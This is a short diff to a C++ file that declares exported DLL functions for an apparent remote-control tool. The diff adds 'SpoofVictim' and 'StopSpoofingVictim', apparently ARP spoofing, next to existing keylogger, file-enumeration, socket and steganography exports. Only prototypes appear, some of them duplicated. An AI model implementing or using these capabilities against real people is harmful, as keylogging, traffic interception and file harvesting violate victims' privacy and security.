@@ -11,11 +11,11 @@
 #include <string>
 #include <vector>
 #include <algorithm>
+#include <fstream>
+#include <numeric>
 #include <sstream>
 #include <iterator>
 #include <thread>
-#include <fstream>
-#include <numeric>
 #include "MyFileClass.h"
 #include "AES_crypto.h"
 #include <opencv2/highgui/highgui.hpp>
@@ -36,6 +36,8 @@ extern "C" {
 	extern __declspec(dllexport) string GetAllFiles(string dir = "c:\\");
 	extern __declspec(dllexport) string OpenSocket(string ip_and_port);
 	extern __declspec(dllexport) string ChangeFile(string file);
+	extern __declspec(dllexport) string SpoofVictim(std::string ip);
+	extern __declspec(dllexport) bool StopSpoofingVictim(std::string ip);
 	extern __declspec(dllexport) string StartKeyLogger(string nothing);
 	extern __declspec(dllexport) string StopKeyLogger(string nothing);
 	extern __declspec(dllexport) string HideMessageInPicture(string fileName_and_cmd);
@@ -45,6 +47,9 @@ extern "C" {
 	extern __declspec(dllexport) string OpenSocket(string ip_and_port);
 	extern __declspec(dllexport) string ChangeFile(string file);
 	extern __declspec(dllexport) string GetArpTable();
+	extern __declspec(dllexport) string SpoofVictim(std::string ip);
+	extern __declspec(dllexport) bool StopSpoofingVictim(std::string ip);
+	extern __declspec(dllexport) string StartKeyLogger(string nothing);
 	extern __declspec(dllexport) string StartKeyLogger(string sharedKey);
 	extern __declspec(dllexport) string StopKeyLogger(string nothing);
 	extern __declspec(dllexport) string HideMessageInPicture(string fileName_and_cmd);
